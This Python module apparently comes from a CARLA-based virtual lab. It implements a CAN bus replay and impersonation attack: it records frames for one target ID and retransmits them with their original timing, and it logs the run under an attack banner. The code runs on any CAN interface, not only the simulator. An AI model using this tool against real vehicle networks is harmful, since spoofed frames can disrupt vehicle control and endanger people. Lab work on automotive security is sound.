"""Capture and replay CAN frames inside the YES-CARLA-CAN virtual lab.

The functions in this module receive an already-open python-can bus.  Keeping
bus creation in the CLI makes the timing logic easy to test without requiring
root privileges, SocketCAN, or a running CARLA server.
"""

from dataclasses import dataclass
import time
from typing import Callable, List, Optional, Sequence

import can


@dataclass(frozen=True)
class CapturedCANFrame:
    """A CAN frame plus its arrival time relative to the first matching frame."""

    timestamp: float
    arbitration_id: int
    dlc: int
    data: bytes
    is_extended_id: bool = False
    is_remote_frame: bool = False

    @classmethod
    def from_message(cls, message: can.Message, timestamp: float) -> "CapturedCANFrame":
        """Copy mutable python-can message data into an immutable capture record."""
        return cls(
            timestamp=timestamp,
            arbitration_id=message.arbitration_id,
            dlc=message.dlc,
            data=bytes(message.data),
            is_extended_id=message.is_extended_id,
            is_remote_frame=message.is_remote_frame,
        )

    def to_message(self) -> can.Message:
        """Create a fresh python-can message for retransmission."""
        return can.Message(
            arbitration_id=self.arbitration_id,
            dlc=self.dlc,
            data=self.data,
            is_extended_id=self.is_extended_id,
            is_remote_frame=self.is_remote_frame,
        )


FrameCallback = Callable[[CapturedCANFrame], None]


def capture_frames(
    bus: can.BusABC,
    target_can_id: int,
    capture_time: float,
    *,
    clock: Callable[[], float] = time.monotonic,
    on_capture: Optional[FrameCallback] = None,
) -> List[CapturedCANFrame]:
    """Capture only ``target_can_id`` frames for ``capture_time`` seconds.

    Timestamps are measured with a monotonic clock and stored relative to the
    first matching frame.  Relative times are immune to wall-clock adjustments
    and can therefore be used directly by :func:`replay_frames`.
    """
    if not 0 <= target_can_id <= 0x1FFFFFFF:
        raise ValueError("CAN ID must be between 0x000 and 0x1FFFFFFF")
    if capture_time <= 0:
        raise ValueError("Capture time must be greater than zero")

    captured: List[CapturedCANFrame] = []
    capture_deadline = clock() + capture_time
    first_arrival: Optional[float] = None

    while True:
        remaining = capture_deadline - clock()
        if remaining <= 0:
            break

        # A short timeout keeps Ctrl+C responsive while still avoiding a busy
        # polling loop when the selected ID is not present on the bus.
        message = bus.recv(timeout=min(remaining, 0.1))
        if message is None or message.arbitration_id != target_can_id:
            continue

        arrival = clock()
        if first_arrival is None:
            first_arrival = arrival
        frame = CapturedCANFrame.from_message(message, arrival - first_arrival)
        captured.append(frame)
        if on_capture is not None:
            on_capture(frame)

    return captured


def replay_frames(
    bus: can.BusABC,
    frames: Sequence[CapturedCANFrame],
    repetitions: int = 1,
    *,
    clock: Callable[[], float] = time.monotonic,
    sleep: Callable[[float], None] = time.sleep,
    on_replay: Optional[FrameCallback] = None,
) -> int:
    """Replay frames in order while reproducing their relative timing.

    Each repetition starts a new timing epoch.  Scheduling against absolute
    deadlines (rather than sleeping for each interval) prevents send overhead
    from accumulating as timing drift over a long capture.
    """
    if repetitions < 1:
        raise ValueError("Replay repetitions must be at least one")
    if not frames:
        return 0

    first_timestamp = frames[0].timestamp
    previous_timestamp = first_timestamp
    for frame in frames:
        if frame.timestamp < previous_timestamp:
            raise ValueError("Captured frames must be ordered by timestamp")
        previous_timestamp = frame.timestamp

    sent = 0
    for _ in range(repetitions):
        replay_start = clock()
        for frame in frames:
            relative_time = frame.timestamp - first_timestamp
            wait_time = replay_start + relative_time - clock()
            if wait_time > 0:
                sleep(wait_time)
            bus.send(frame.to_message())
            sent += 1
            if on_replay is not None:
                on_replay(frame)

    return sent


def format_frame(frame: CapturedCANFrame) -> str:
    """Return one human-readable line used by capture and replay logs."""
    data = " ".join(f"{byte:02X}" for byte in frame.data)
    return (
        f"+{frame.timestamp:7.3f}s  ID=0x{frame.arbitration_id:03X}  "
        f"DLC={frame.dlc}  DATA={data}"
    )


def run_replay_attack(
    bus: can.BusABC,
    interface: str,
    target_can_id: int,
    capture_time: float,
    delay: float,
    repetitions: int,
    *,
    output: Callable[[str], None] = print,
    sleep: Callable[[float], None] = time.sleep,
) -> int:
    """Run the complete capture, wait, and replay workflow with clear logs."""
    if delay < 0:
        raise ValueError("Delay must be zero or greater")

    separator = "=" * 60
    output(separator)
    output("CAN Replay / Impersonation Attack")
    output(separator)
    output(f"Interface      : {interface}")
    output(f"Target CAN ID  : 0x{target_can_id:03X}")
    output(f"Capture time   : {capture_time:g} s")
    output(f"Replay count   : {repetitions}")
    output("")

    frames = capture_frames(
        bus,
        target_can_id,
        capture_time,
        on_capture=lambda frame: output(f"[CAPTURE] {format_frame(frame)}"),
    )
    output(f"\nCaptured {len(frames)} frame(s).")
    if not frames:
        output("No matching frame was captured; replay was not started.")
        output(separator)
        return 0

    if delay:
        output(f"Waiting {delay:g} second(s) before replay...")
        sleep(delay)

    output("\nStarting replay...")
    sent = replay_frames(
        bus,
        frames,
        repetitions,
        on_replay=lambda frame: output(f"[REPLAY]  {format_frame(frame)}"),
    )
    output(f"\nReplay completed. Sent {sent} frame(s).")
    output(separator)
    return sent
